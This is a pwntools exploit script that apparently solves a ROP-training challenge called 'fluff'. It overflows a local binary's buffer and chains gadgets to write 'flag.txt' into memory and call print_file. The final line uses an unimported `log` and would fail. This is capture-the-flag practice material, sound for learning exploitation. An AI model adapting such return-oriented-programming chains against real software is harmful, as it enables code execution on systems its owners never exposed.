#!/usr/bin/python3
from pwn import process, p64

shell = process("./fluff")

offset = 40
junk = b"A" * offset

strings = [
    0x4003c8, # f
    0x4003e4, # l
    0x60041a, # a
    0x4003cf, # g
    0x400439, # .
    0x4003f1, # t
    0x4007bc, # x
    0x4003f1  # t
]

flag = "flag.txt"

rax = 0xb

payload  = b""
payload += junk

for i in range(len(flag)):
    payload += p64(0x40062a)                  # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    payload += p64(0x2000)                    # value for pop
    payload += p64(strings[i] - 0x3ef2 - rax) # offset to add
    payload += p64(0x400628)                  # xlatb; ret;
    payload += p64(0x4006a3)                  # pop rdi; ret;
    payload += p64(0x601028 + i)              # .data
    payload += p64(0x400639)                  # stosb byte ptr [rdi], al; ret;
    rax = ord(flag[i])

payload += p64(0x4006a3) # pop rdi; ret;
payload += p64(0x601028) # "flag.txt"
payload += p64(0x400510) # print_file

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
